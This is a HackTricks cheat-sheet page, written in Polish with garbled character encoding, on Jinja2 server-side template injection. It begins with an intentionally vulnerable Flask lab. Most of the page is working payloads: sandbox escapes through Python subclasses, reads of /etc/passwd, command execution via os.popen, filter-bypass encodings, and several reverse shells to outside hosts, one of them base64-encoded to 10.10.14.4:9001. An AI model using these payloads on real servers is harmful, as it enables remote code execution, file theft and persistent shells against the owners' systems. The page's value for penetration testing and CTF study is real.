# Jinja2 SSTI

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF** sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>

## **Lab**
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
if request.args.get('c'):
return render_template_string(request.args.get('c'))
else:
return "Hello, send someting inside the param 'c'!"

if __name__ == "__main__":
app.run()
```
### **Polecenie Debugowania**

JeÅ›li rozszerzenie Debug jest wÅ‚Ä…czone, tag `debug` bÄ™dzie dostÄ™pny do wypisania bieÅ¼Ä…cego kontekstu oraz dostÄ™pnych filtrÃ³w i testÃ³w. Jest to przydatne do zobaczenia, co jest dostÄ™pne do uÅ¼ycia w szablonie bez koniecznoÅ›ci ustawiania debugera.
```python
<pre>

{% raw %}
{% debug %}
{% endraw %}




</pre>
```
### **Wyrzucenie wszystkich zmiennych konfiguracyjnych**
```python
{{ config }} #In these object you can find all the configured env variables


{% raw %}
{% for key, value in config.items() %}
<dt>{{ key|e }}</dt>
<dd>{{ value|e }}</dd>
{% endfor %}
{% endraw %}


```
## **WstrzykniÄ™cie Jinja**

Po pierwsze, w wstrzykniÄ™ciu Jinja musisz **znaleÅºÄ‡ sposÃ³b na ucieczkÄ™ z piaskownicy** i odzyskanie dostÄ™pu do zwykÅ‚ego przepÅ‚ywu wykonania w Pythonie. Aby to zrobiÄ‡, musisz **naduÅ¼yÄ‡ obiektÃ³w**, ktÃ³re pochodzÄ… **z** Å›rodowiska **bez piaskownicy, ale sÄ… dostÄ™pne z piaskownicy**.

### DostÄ™p do obiektÃ³w globalnych

Na przykÅ‚ad w kodzie `render_template("hello.html", username=username, email=email)` obiekty username i email **pochodzÄ… z niezabezpieczonego Å›rodowiska Pythona** i bÄ™dÄ… **dostÄ™pne** wewnÄ…trz **Å›rodowiska z piaskownicÄ…**.\
Co wiÄ™cej, istniejÄ… inne obiekty, ktÃ³re bÄ™dÄ… **zawsze dostÄ™pne z Å›rodowiska z piaskownicÄ…**, sÄ… to:
```
[]
''
()
dict
config
request
```
### Odzyskiwanie \<class 'object'>

NastÄ™pnie, z tych obiektÃ³w musimy dotrzeÄ‡ do klasy: **`<class 'object'>`** aby sprÃ³bowaÄ‡ **odzyskaÄ‡** zdefiniowane **klasy**. Jest to konieczne, poniewaÅ¼ z tego obiektu moÅ¼emy wywoÅ‚aÄ‡ metodÄ™ **`__subclasses__`** i **uzyskaÄ‡ dostÄ™p do wszystkich klas z niezabezpieczonego** Å›rodowiska pythona.

Aby uzyskaÄ‡ dostÄ™p do tej **klasy obiektu**, musisz uzyskaÄ‡ dostÄ™p do **obiektu klasy** a nastÄ™pnie uzyskaÄ‡ dostÄ™p do **`__base__`**, **`__mro__()[-1]`** lub `.`**`mro()[-1]`**. NastÄ™pnie, **po** dotarciu do tej **klasy obiektu** wywoÅ‚ujemy **`__subclasses__()`**.

SprawdÅº te przykÅ‚ady:
```python
# To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object".
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% raw %}
{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
{% endraw %}


# Not sure if this will work, but I saw it somewhere
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
```
### Ucieczka RCE

**Po odzyskaniu** `<class 'object'>` i wywoÅ‚aniu `__subclasses__` moÅ¼emy teraz uÅ¼yÄ‡ tych klas do odczytywania i zapisywania plikÃ³w oraz wykonywania kodu.

WywoÅ‚anie `__subclasses__` daÅ‚o nam moÅ¼liwoÅ›Ä‡ **dostÄ™pu do setek nowych funkcji**, bÄ™dziemy zadowoleni tylko przez dostÄ™p do klasy **pliku** do **odczytu/zapisu plikÃ³w** lub dowolnej klasy z dostÄ™pem do klasy, ktÃ³ra **pozwala na wykonywanie poleceÅ„** (jak `os`).

**Odczyt/Zapis zdalnego pliku**
```python
# ''.__class__.__mro__[1].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```
**Uruchamianie kodu zdalnego**
```python
# The class 396 is the class <class 'subprocess.Popen'>
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

# Without '{{' and '}}'

<div data-gb-custom-block data-tag="if" data-0='application' data-1='][' data-2='][' data-3='__globals__' data-4='][' data-5='__builtins__' data-6='__import__' data-7='](' data-8='os' data-9='popen' data-10='](' data-11='id' data-12='read' data-13=']() == ' data-14='chiv'> a </div>

# Calling os.popen without guessing the index of the class
{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

## Passing the cmd line in a GET param
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{% endraw %}


## Passing the cmd line ?cmd=id, Without " and '
{{ dict.mro()[-1].__subclasses__()[276](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}

```
Aby dowiedzieÄ‡ siÄ™ o **wiÄ™cej klasach**, ktÃ³re moÅ¼esz uÅ¼yÄ‡ do **unikniÄ™cia**, moÅ¼esz **sprawdziÄ‡**:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### OminiÄ™cia filtrÃ³w

#### Powszechne ominiÄ™cia

Te ominiÄ™cia pozwolÄ… nam **uzyskaÄ‡ dostÄ™p** do **atrybutÃ³w** obiektÃ³w **bez uÅ¼ycia niektÃ³rych znakÃ³w**.\
JuÅ¼ widzieliÅ›my niektÃ³re z tych ominiÄ™Ä‡ w przykÅ‚adach wczeÅ›niejszych, ale podsumujmy je tutaj:
```bash
# Without quotes, _, [, ]
## Basic ones
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join) # Join trick

## Using request object options
request|attr(request.headers.c) #Send a header like "c: __class__" (any trick using get params can be used with headers also)
request|attr(request.args.c) #Send a param like "?c=__class__
request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params

## Lists without "[" and "]"
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_

# Using with

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
{% endraw %}


```
* [**PowrÃ³t tutaj po wiÄ™cej opcji dostÄ™pu do obiektu globalnego**](jinja2-ssti.md#accessing-global-objects)
* [**PowrÃ³t tutaj po wiÄ™cej opcji dostÄ™pu do klasy obiektu**](jinja2-ssti.md#recovering-less-than-class-object-greater-than)
* [**Przeczytaj to, aby uzyskaÄ‡ RCE bez klasy obiektu**](jinja2-ssti.md#jinja-injection-without-less-than-class-object-greater-than)

**Unikanie kodowania HTML**

DomyÅ›lnie Flask koduje HTML we wszystkich szablonach ze wzglÄ™dÃ³w bezpieczeÅ„stwa:
```python
{{'<script>alert(1);</script>'}}
#will be
&lt;script&gt;alert(1);&lt;/script&gt;
```
**Filtr `safe`** pozwala nam wstrzyknÄ…Ä‡ JavaScript i HTML na stronÄ™ **bez** kodowania **HTML**, w ten sposÃ³b:
```python
{{'<script>alert(1);</script>'|safe}}
#will be
<script>alert(1);</script>
```
**Uruchamianie kodu zdalnego poprzez napisanie zÅ‚oÅ›liwego pliku konfiguracyjnego.**
```python
# evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```
## Bez kilku znakÃ³w

Bez **`{{`** **`.`** **`[`** **`]`** **`}}`** **`_`**
```python
{% raw %}
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
{% endraw %}


```
## WstrzykniÄ™cie Jinja bez **\<class 'object'>**

Z [**obiektÃ³w globalnych**](jinja2-ssti.md#accessing-global-objects) istnieje inny sposÃ³b na uzyskanie **RCE bez uÅ¼ycia tej klasy.**\
JeÅ›li uda ci siÄ™ uzyskaÄ‡ dostÄ™p do jakiejkolwiek **funkcji** z tych obiektÃ³w globalnych, bÄ™dziesz mÃ³gÅ‚ uzyskaÄ‡ dostÄ™p do **`__globals__.__builtins__`** i stamtÄ…d **RCE** jest bardzo **proste**.

MoÅ¼esz **znaleÅºÄ‡ funkcje** z obiektÃ³w **`request`**, **`config`** i dowolnego **innego** interesujÄ…cego **obiektu globalnego**, do ktÃ³rego masz dostÄ™p za pomocÄ…:
```bash
{{ request.__class__.__dict__ }}
- application
- _load_form_data
- on_json_loading_failed

{{ config.__class__.__dict__ }}
- __init__
- from_envvar
- from_pyfile
- from_object
- from_file
- from_json
- from_mapping
- get_namespace
- __repr__

# You can iterate through children objects to find more
```
Gdy juÅ¼ znajdziesz pewne funkcje, moÅ¼esz odzyskaÄ‡ wbudowane funkcje za pomocÄ…:
```python
# Read file
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}
{% endraw %}

## Extra
## The global from config have a access to a function called import_string
## with this function you don't need to access the builtins
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

# All the bypasses seen in the previous sections are also valid
```
### Fuzzing WAF bypass

**Fenjing** [https://github.com/Marven11/Fenjing](https://github.com/Marven11/Fenjing) æ˜¯ä¸€ç§ä¸“é—¨ç”¨äº CTF çš„å·¥å…·ï¼Œä½†ä¹Ÿå¯ä»¥ç”¨äºåœ¨çœŸå®åœºæ™¯ä¸­æš´åŠ›ç ´è§£æ— æ•ˆå‚æ•°ã€‚è¯¥å·¥å…·åªæ˜¯å‘æœåŠ¡å™¨å‘é€å•è¯å’ŒæŸ¥è¯¢ä»¥æ£€æµ‹è¿‡æ»¤å™¨ï¼Œæœç´¢ç»•è¿‡æ–¹å¼ï¼Œå¹¶æä¾›äº¤äº’å¼æ§åˆ¶å°ã€‚
```
webui:
As the name suggests, web UI
Default port 11451

scan: scan the entire website
Extract all forms from the website based on the form element and attack them
After the scan is successful, a simulated terminal will be provided or the given command will be executed.
Example:python -m fenjing scan --url 'http://xxx/'

crack: Attack a specific form
You need to specify the form's url, action (GET or POST) and all fields (such as 'name')
After a successful attack, a simulated terminal will also be provided or a given command will be executed.
Example:python -m fenjing crack --url 'http://xxx/' --method GET --inputs name

crack-path: attack a specific path
Attack http://xxx.xxx/hello/<payload>the vulnerabilities that exist in a certain path (such as
The parameters are roughly the same as crack, but you only need to provide the corresponding path
Example:python -m fenjing crack-path --url 'http://xxx/hello/'

crack-request: Read a request file for attack
Read the request in the file, PAYLOADreplace it with the actual payload and submit it
The request will be urlencoded by default according to the HTTP format, which can be --urlencode-payload 0turned off.
```
## OdnoÅ›niki

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
* SprawdÅº [szczegÃ³Å‚ wskazÃ³wki dotyczÄ…ce omijania zablokowanych znakÃ³w tutaj](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/#python3).
* [https://twitter.com/SecGus/status/1198976764351066113](https://twitter.com/SecGus/status/1198976764351066113)
* [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF** SprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
